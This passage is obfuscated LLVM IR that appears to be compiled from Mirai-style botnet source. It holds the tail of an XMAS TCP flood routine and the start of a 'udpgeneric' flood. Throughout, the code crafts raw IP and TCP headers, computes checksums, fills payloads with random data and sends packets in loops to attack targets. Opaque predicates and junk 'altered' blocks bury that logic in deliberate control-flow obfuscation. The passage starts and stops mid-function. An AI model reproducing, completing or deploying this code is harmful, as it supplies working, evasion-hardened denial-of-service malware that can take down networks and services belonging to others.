  %549 = or i16 %548, %547
  store i16 %549, i16* %544, align 4
  %550 = load i8, i8* %20, align 1
  %551 = sext i8 %550 to i16
  %552 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %553 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %552, i32 0, i32 4
  %554 = load i16, i16* %553, align 4
  %555 = and i16 %551, 1
  %556 = shl i16 %555, 11
  %557 = and i16 %554, -2049
  %558 = or i16 %557, %556
  store i16 %558, i16* %553, align 4
  %559 = load i8, i8* %21, align 1
  %560 = sext i8 %559 to i16
  %561 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %562 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %561, i32 0, i32 4
  %563 = load i16, i16* %562, align 4
  %564 = and i16 %560, 1
  %565 = shl i16 %564, 10
  %566 = and i16 %563, -1025
  %567 = or i16 %566, %565
  store i16 %567, i16* %562, align 4
  %568 = load i8, i8* %22, align 1
  %569 = sext i8 %568 to i16
  %570 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 4
  %572 = load i16, i16* %571, align 4
  %573 = and i16 %569, 1
  %574 = shl i16 %573, 9
  %575 = and i16 %572, -513
  %576 = or i16 %575, %574
  store i16 %576, i16* %571, align 4
  %577 = load i8, i8* %23, align 1
  %578 = sext i8 %577 to i16
  %579 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 4
  %581 = load i16, i16* %580, align 4
  %582 = and i16 %578, 1
  %583 = shl i16 %582, 8
  %584 = and i16 %581, -257
  %585 = or i16 %584, %583
  store i16 %585, i16* %580, align 4
  %586 = load i8*, i8** %38, align 8
  %587 = load i32, i32* %24, align 4
  call void @rand_str(i8* %586, i32 %587)
  br label %667

; <label>:588:                                    ; preds = %originalBBpart237, %339
  %589 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 4
  %591 = load i16, i16* %590, align 4
  %592 = lshr i16 %591, 8
  %593 = and i16 %592, 1
  %594 = zext i16 %593 to i32
  %595 = icmp ne i32 %594, 0
  br i1 %595, label %604, label %596

; <label>:596:                                    ; preds = %588
  %597 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 4
  %599 = load i16, i16* %598, align 4
  %600 = lshr i16 %599, 10
  %601 = and i16 %600, 1
  %602 = zext i16 %601 to i32
  %603 = icmp ne i32 %602, 0
  br i1 %603, label %604, label %607

; <label>:604:                                    ; preds = %596, %588
  %605 = load i32, i32* %26, align 4
  %606 = call i32 @close(i32 %605)
  br label %153

; <label>:607:                                    ; preds = %596
  br label %608

; <label>:608:                                    ; preds = %607
  %609 = load i32, i32* @x.29
  %610 = load i32, i32* @y.30
  %611 = sub i32 %609, 1
  %612 = mul i32 %609, %611
  %613 = urem i32 %612, 2
  %614 = icmp eq i32 %613, 0
  %615 = icmp slt i32 %610, 10
  %616 = or i1 %614, %615
  br i1 %616, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %608
  %617 = load i32, i32* @x.29
  %618 = load i32, i32* @y.30
  %619 = sub i32 %617, 1
  %620 = mul i32 %617, %619
  %621 = urem i32 %620, 2
  %622 = icmp eq i32 %621, 0
  %623 = icmp slt i32 %618, 10
  %624 = or i1 %622, %623
  br i1 %624, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %625

; <label>:625:                                    ; preds = %originalBBpart241, %originalBBpart224
  br label %626

; <label>:626:                                    ; preds = %625, %307, %originalBBpart220
  %627 = load i32, i32* @x.29
  %628 = load i32, i32* @y.30
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %626
  %635 = call i64 @time(i64* null) #7
  %636 = load i64, i64* %31, align 8
  %637 = sub nsw i64 %635, %636
  %638 = icmp sgt i64 %637, 10
  %639 = load i32, i32* @x.29
  %640 = load i32, i32* @y.30
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBBpart259, label %originalBB43alteredBB

originalBBpart259:                                ; preds = %originalBB43
  br i1 %638, label %647, label %666

; <label>:647:                                    ; preds = %originalBBpart259
  %648 = load i32, i32* @x.29
  %649 = load i32, i32* @y.30
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %647
  %656 = load i32, i32* %26, align 4
  %657 = call i32 @close(i32 %656)
  %658 = load i32, i32* @x.29
  %659 = load i32, i32* @y.30
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %153

; <label>:666:                                    ; preds = %originalBBpart259
  br label %271

; <label>:667:                                    ; preds = %466
  %668 = load i32, i32* @x.29
  %669 = load i32, i32* @y.30
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %667
  %676 = load i32, i32* @x.29
  %677 = load i32, i32* @y.30
  %678 = sub i32 %676, 1
  %679 = mul i32 %676, %678
  %680 = urem i32 %679, 2
  %681 = icmp eq i32 %680, 0
  %682 = icmp slt i32 %677, 10
  %683 = or i1 %681, %682
  br i1 %683, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %684

; <label>:684:                                    ; preds = %originalBBpart267, %172
  %685 = load i32, i32* %9, align 4
  %686 = add nsw i32 %685, 1
  store i32 %686, i32* %9, align 4
  br label %131

; <label>:687:                                    ; preds = %originalBBpart24
  br label %688

; <label>:688:                                    ; preds = %862, %687
  store i32 0, i32* %9, align 4
  br label %689

; <label>:689:                                    ; preds = %originalBBpart2113, %688
  %690 = load i32, i32* %9, align 4
  %691 = load i8, i8* %5, align 1
  %692 = zext i8 %691 to i32
  %693 = icmp slt i32 %690, %692
  br i1 %693, label %694, label %862

; <label>:694:                                    ; preds = %689
  %695 = load i8**, i8*** %12, align 8
  %696 = load i32, i32* %9, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds i8*, i8** %695, i64 %697
  %699 = load i8*, i8** %698, align 8
  store i8* %699, i8** %39, align 8
  %700 = load i8*, i8** %39, align 8
  %701 = bitcast i8* %700 to %struct.iphdr*
  store %struct.iphdr* %701, %struct.iphdr** %40, align 8
  %702 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %703 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %702, i64 1
  %704 = bitcast %struct.iphdr* %703 to %struct.tcphdr*
  store %struct.tcphdr* %704, %struct.tcphdr** %41, align 8
  %705 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %706 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %705, i64 1
  %707 = bitcast %struct.tcphdr* %706 to i8*
  store i8* %707, i8** %42, align 8
  %708 = load i16, i16* %14, align 2
  %709 = zext i16 %708 to i32
  %710 = icmp eq i32 %709, 65535
  br i1 %710, label %711, label %733

; <label>:711:                                    ; preds = %694
  %712 = load i32, i32* @x.29
  %713 = load i32, i32* @y.30
  %714 = sub i32 %712, 1
  %715 = mul i32 %712, %714
  %716 = urem i32 %715, 2
  %717 = icmp eq i32 %716, 0
  %718 = icmp slt i32 %713, 10
  %719 = or i1 %717, %718
  br i1 %719, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %711
  %720 = call i32 @rand_next()
  %721 = and i32 %720, 65535
  %722 = trunc i32 %721 to i16
  %723 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %724 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %723, i32 0, i32 3
  store i16 %722, i16* %724, align 4
  %725 = load i32, i32* @x.29
  %726 = load i32, i32* @y.30
  %727 = sub i32 %725, 1
  %728 = mul i32 %725, %727
  %729 = urem i32 %728, 2
  %730 = icmp eq i32 %729, 0
  %731 = icmp slt i32 %726, 10
  %732 = or i1 %730, %731
  br i1 %732, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %733

; <label>:733:                                    ; preds = %originalBBpart271, %694
  %734 = load i8, i8* %25, align 1
  %735 = icmp ne i8 %734, 0
  br i1 %735, label %736, label %755

; <label>:736:                                    ; preds = %733
  %737 = load i32, i32* @x.29
  %738 = load i32, i32* @y.30
  %739 = sub i32 %737, 1
  %740 = mul i32 %737, %739
  %741 = urem i32 %740, 2
  %742 = icmp eq i32 %741, 0
  %743 = icmp slt i32 %738, 10
  %744 = or i1 %742, %743
  br i1 %744, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %736
  %745 = load i8*, i8** %42, align 8
  %746 = load i32, i32* %24, align 4
  call void @rand_str(i8* %745, i32 %746)
  %747 = load i32, i32* @x.29
  %748 = load i32, i32* @y.30
  %749 = sub i32 %747, 1
  %750 = mul i32 %747, %749
  %751 = urem i32 %750, 2
  %752 = icmp eq i32 %751, 0
  %753 = icmp slt i32 %748, 10
  %754 = or i1 %752, %753
  br i1 %754, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %755

; <label>:755:                                    ; preds = %originalBBpart275, %733
  %756 = load i32, i32* @x.29
  %757 = load i32, i32* @y.30
  %758 = sub i32 %756, 1
  %759 = mul i32 %756, %758
  %760 = urem i32 %759, 2
  %761 = icmp eq i32 %760, 0
  %762 = icmp slt i32 %757, 10
  %763 = or i1 %761, %762
  br i1 %763, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %755
  %764 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %765 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %764, i32 0, i32 7
  store i16 0, i16* %765, align 2
  %766 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %767 = bitcast %struct.iphdr* %766 to i16*
  %768 = call zeroext i16 @checksum_generic(i16* %767, i32 20)
  %769 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %770 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %769, i32 0, i32 7
  store i16 %768, i16* %770, align 2
  %771 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %772 = load i32, i32* %9, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %771, i64 %773
  %775 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %774, i32 0, i32 1
  %776 = load i32, i32* %775, align 4
  %777 = add i32 %776, 1
  store i32 %777, i32* %775, align 4
  %778 = trunc i32 %776 to i16
  %779 = call zeroext i16 @htons(i16 zeroext %778) #8
  %780 = zext i16 %779 to i32
  %781 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %782 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %781, i32 0, i32 2
  store i32 %780, i32* %782, align 4
  %783 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %784 = load i32, i32* %9, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %783, i64 %785
  %787 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %786, i32 0, i32 2
  %788 = load i32, i32* %787, align 4
  %789 = trunc i32 %788 to i16
  %790 = call zeroext i16 @htons(i16 zeroext %789) #8
  %791 = zext i16 %790 to i32
  %792 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %793 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %792, i32 0, i32 3
  store i32 %791, i32* %793, align 4
  %794 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %795 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %794, i32 0, i32 6
  store i16 0, i16* %795, align 4
  %796 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %797 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %798 = bitcast %struct.tcphdr* %797 to i8*
  %799 = load i32, i32* %24, align 4
  %800 = sext i32 %799 to i64
  %801 = add i64 20, %800
  %802 = trunc i64 %801 to i16
  %803 = call zeroext i16 @htons(i16 zeroext %802) #8
  %804 = load i32, i32* %24, align 4
  %805 = sext i32 %804 to i64
  %806 = add i64 20, %805
  %807 = trunc i64 %806 to i32
  %808 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %796, i8* %798, i16 zeroext %803, i32 %807)
  %809 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %810 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %809, i32 0, i32 6
  store i16 %808, i16* %810, align 4
  %811 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %812 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %811, i32 0, i32 1
  %813 = load i16, i16* %812, align 2
  %814 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %815 = load i32, i32* %9, align 4
  %816 = sext i32 %815 to i64
  %817 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %814, i64 %816
  %818 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %817, i32 0, i32 0
  %819 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %818, i32 0, i32 1
  store i16 %813, i16* %819, align 2
  %820 = load i32, i32* %10, align 4
  %821 = load i8*, i8** %39, align 8
  %822 = load i32, i32* %24, align 4
  %823 = sext i32 %822 to i64
  %824 = add i64 40, %823
  %825 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %826 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %827 = load i32, i32* %9, align 4
  %828 = sext i32 %827 to i64
  %829 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %826, i64 %828
  %830 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %829, i32 0, i32 0
  %831 = bitcast %struct.sockaddr_in* %830 to %struct.sockaddr*
  store %struct.sockaddr* %831, %struct.sockaddr** %825, align 8
  %832 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %833 = load %struct.sockaddr*, %struct.sockaddr** %832, align 8
  %834 = call i64 @sendto(i32 %820, i8* %821, i64 %824, i32 16384, %struct.sockaddr* %833, i32 16)
  %835 = load i32, i32* @x.29
  %836 = load i32, i32* @y.30
  %837 = sub i32 %835, 1
  %838 = mul i32 %835, %837
  %839 = urem i32 %838, 2
  %840 = icmp eq i32 %839, 0
  %841 = icmp slt i32 %836, 10
  %842 = or i1 %840, %841
  br i1 %842, label %originalBBpart2103, label %originalBB77alteredBB

originalBBpart2103:                               ; preds = %originalBB77
  br label %843

; <label>:843:                                    ; preds = %originalBBpart2103
  %844 = load i32, i32* @x.29
  %845 = load i32, i32* @y.30
  %846 = sub i32 %844, 1
  %847 = mul i32 %844, %846
  %848 = urem i32 %847, 2
  %849 = icmp eq i32 %848, 0
  %850 = icmp slt i32 %845, 10
  %851 = or i1 %849, %850
  br i1 %851, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %843
  %852 = load i32, i32* %9, align 4
  %853 = add nsw i32 %852, 1
  store i32 %853, i32* %9, align 4
  %854 = load i32, i32* @x.29
  %855 = load i32, i32* @y.30
  %856 = sub i32 %854, 1
  %857 = mul i32 %854, %856
  %858 = urem i32 %857, 2
  %859 = icmp eq i32 %858, 0
  %860 = icmp slt i32 %855, 10
  %861 = or i1 %859, %860
  br i1 %861, label %originalBBpart2113, label %originalBB105alteredBB

originalBBpart2113:                               ; preds = %originalBB105
  br label %689

; <label>:862:                                    ; preds = %689
  br label %688

; <label>:863:                                    ; preds = %282, %127, %105
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %106
  store i32 1, i32* %9, align 4
  %864 = load i32, i32* %10, align 4
  %865 = bitcast i32* %9 to i8*
  %866 = call i32 @setsockopt(i32 %864, i32 0, i32 3, i8* %865, i32 4) #7
  %867 = icmp eq i32 %866, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %131
  %868 = load i32, i32* %9, align 4
  %869 = load i8, i8* %5, align 1
  %870 = zext i8 %869 to i32
  %871 = icmp slt i32 %868, %870
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %153
  %872 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %872, i32* %26, align 4
  %873 = icmp eq i32 %872, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %209
  %874 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %875 = load i32, i32* %9, align 4
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %874, i64 %876
  %878 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %877, i32 0, i32 1
  %879 = load i32, i32* %878, align 4
  %880 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %881 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %880, i32 0, i32 0
  store i32 %879, i32* %881, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %243
  %882 = load i16, i16* %17, align 2
  %883 = call zeroext i16 @htons(i16 zeroext %882) #8
  %884 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %883, i16* %884, align 2
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %283
  %885 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %886 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %885, i32 0, i32 0
  %887 = load i32, i32* %886, align 4
  %888 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %889 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %888, i32 0, i32 0
  %890 = load i32, i32* %889, align 4
  %891 = icmp eq i32 %887, %890
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %311
  %892 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %893 = getelementptr inbounds i8, i8* %892, i64 20
  %894 = bitcast i8* %893 to %struct.tcphdr*
  store %struct.tcphdr* %894, %struct.tcphdr** %35, align 8
  %895 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %896 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %895, i32 0, i32 0
  %897 = load i16, i16* %896, align 4
  %898 = zext i16 %897 to i32
  %899 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %900 = load i16, i16* %899, align 2
  %901 = zext i16 %900 to i32
  %902 = icmp eq i32 %898, %901
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %347
  %903 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %904 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %903, i32 0, i32 4
  %905 = load i16, i16* %904, align 4
  %_ = sub i16 %905, 12
  %gen = mul i16 %_, 12
  %_27 = sub i16 0, %905
  %gen28 = add i16 %_27, 12
  %906 = lshr i16 %905, 12
  %_29 = shl i16 %906, 1
  %_30 = sub i16 %906, 1
  %gen31 = mul i16 %_30, 1
  %_32 = sub i16 0, %906
  %gen33 = add i16 %_32, 1
  %_34 = sub i16 %906, 1
  %gen35 = mul i16 %_34, 1
  %907 = and i16 %906, 1
  %908 = zext i16 %907 to i32
  %909 = icmp ne i32 %908, 0
  br label %originalBB26

originalBB39alteredBB:                            ; preds = %originalBB39, %608
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %626
  %910 = call i64 @time(i64* null) #7
  %911 = load i64, i64* %31, align 8
  %_44 = sub i64 0, %910
  %gen45 = add i64 %_44, %911
  %_46 = shl i64 %910, %911
  %_47 = sub i64 0, %910
  %gen48 = add i64 %_47, %911
  %_49 = shl i64 %910, %911
  %_50 = sub i64 %910, %911
  %gen51 = mul i64 %_50, %911
  %_52 = sub i64 %910, %911
  %gen53 = mul i64 %_52, %911
  %_54 = sub i64 0, %910
  %gen55 = add i64 %_54, %911
  %_56 = sub i64 0, %910
  %gen57 = add i64 %_56, %911
  %912 = sub nsw i64 %910, %911
  %913 = icmp sgt i64 %912, 10
  br label %originalBB43

originalBB61alteredBB:                            ; preds = %originalBB61, %647
  %914 = load i32, i32* %26, align 4
  %915 = call i32 @close(i32 %914)
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %667
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %711
  %916 = call i32 @rand_next()
  %917 = and i32 %916, 65535
  %918 = trunc i32 %917 to i16
  %919 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %920 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %919, i32 0, i32 3
  store i16 %918, i16* %920, align 4
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %736
  %921 = load i8*, i8** %42, align 8
  %922 = load i32, i32* %24, align 4
  call void @rand_str(i8* %921, i32 %922)
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %755
  %923 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %924 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %923, i32 0, i32 7
  store i16 0, i16* %924, align 2
  %925 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %926 = bitcast %struct.iphdr* %925 to i16*
  %927 = call zeroext i16 @checksum_generic(i16* %926, i32 20)
  %928 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %929 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %928, i32 0, i32 7
  store i16 %927, i16* %929, align 2
  %930 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %931 = load i32, i32* %9, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %930, i64 %932
  %934 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %933, i32 0, i32 1
  %935 = load i32, i32* %934, align 4
  %_78 = sub i32 0, %935
  %gen79 = add i32 %_78, 1
  %_80 = shl i32 %935, 1
  %_81 = sub i32 %935, 1
  %gen82 = mul i32 %_81, 1
  %_83 = sub i32 0, %935
  %gen84 = add i32 %_83, 1
  %_85 = sub i32 0, %935
  %gen86 = add i32 %_85, 1
  %936 = add i32 %935, 1
  store i32 %936, i32* %934, align 4
  %937 = trunc i32 %935 to i16
  %938 = call zeroext i16 @htons(i16 zeroext %937) #8
  %939 = zext i16 %938 to i32
  %940 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %941 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %940, i32 0, i32 2
  store i32 %939, i32* %941, align 4
  %942 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %943 = load i32, i32* %9, align 4
  %944 = sext i32 %943 to i64
  %945 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %942, i64 %944
  %946 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %945, i32 0, i32 2
  %947 = load i32, i32* %946, align 4
  %948 = trunc i32 %947 to i16
  %949 = call zeroext i16 @htons(i16 zeroext %948) #8
  %950 = zext i16 %949 to i32
  %951 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %952 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %951, i32 0, i32 3
  store i32 %950, i32* %952, align 4
  %953 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %954 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %953, i32 0, i32 6
  store i16 0, i16* %954, align 4
  %955 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %956 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %957 = bitcast %struct.tcphdr* %956 to i8*
  %958 = load i32, i32* %24, align 4
  %959 = sext i32 %958 to i64
  %_87 = sub i64 20, %959
  %gen88 = mul i64 %_87, %959
  %_89 = sub i64 0, 20
  %gen90 = add i64 %_89, %959
  %_91 = sub i64 0, 20
  %gen92 = add i64 %_91, %959
  %_93 = sub i64 0, 20
  %gen94 = add i64 %_93, %959
  %_95 = sub i64 20, %959
  %gen96 = mul i64 %_95, %959
  %960 = add i64 20, %959
  %961 = trunc i64 %960 to i16
  %962 = call zeroext i16 @htons(i16 zeroext %961) #8
  %963 = load i32, i32* %24, align 4
  %964 = sext i32 %963 to i64
  %_97 = sub i64 20, %964
  %gen98 = mul i64 %_97, %964
  %965 = add i64 20, %964
  %966 = trunc i64 %965 to i32
  %967 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %955, i8* %957, i16 zeroext %962, i32 %966)
  %968 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %969 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %968, i32 0, i32 6
  store i16 %967, i16* %969, align 4
  %970 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %971 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %970, i32 0, i32 1
  %972 = load i16, i16* %971, align 2
  %973 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %974 = load i32, i32* %9, align 4
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %973, i64 %975
  %977 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %976, i32 0, i32 0
  %978 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %977, i32 0, i32 1
  store i16 %972, i16* %978, align 2
  %979 = load i32, i32* %10, align 4
  %980 = load i8*, i8** %39, align 8
  %981 = load i32, i32* %24, align 4
  %982 = sext i32 %981 to i64
  %_99 = shl i64 40, %982
  %_100 = sub i64 40, %982
  %gen101 = mul i64 %_100, %982
  %983 = add i64 40, %982
  %984 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %985 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %986 = load i32, i32* %9, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %985, i64 %987
  %989 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %988, i32 0, i32 0
  %990 = bitcast %struct.sockaddr_in* %989 to %struct.sockaddr*
  store %struct.sockaddr* %990, %struct.sockaddr** %984, align 8
  %991 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %992 = load %struct.sockaddr*, %struct.sockaddr** %991, align 8
  %993 = call i64 @sendto(i32 %979, i8* %980, i64 %983, i32 16384, %struct.sockaddr* %992, i32 16)
  br label %originalBB77

originalBB105alteredBB:                           ; preds = %originalBB105, %843
  %994 = load i32, i32* %9, align 4
  %_106 = sub i32 0, %994
  %gen107 = add i32 %_106, 1
  %_108 = shl i32 %994, 1
  %_109 = shl i32 %994, 1
  %_110 = sub i32 0, %994
  %gen111 = add i32 %_110, 1
  %995 = add nsw i32 %994, 1
  store i32 %995, i32* %9, align 4
  br label %originalBB105
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #7
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
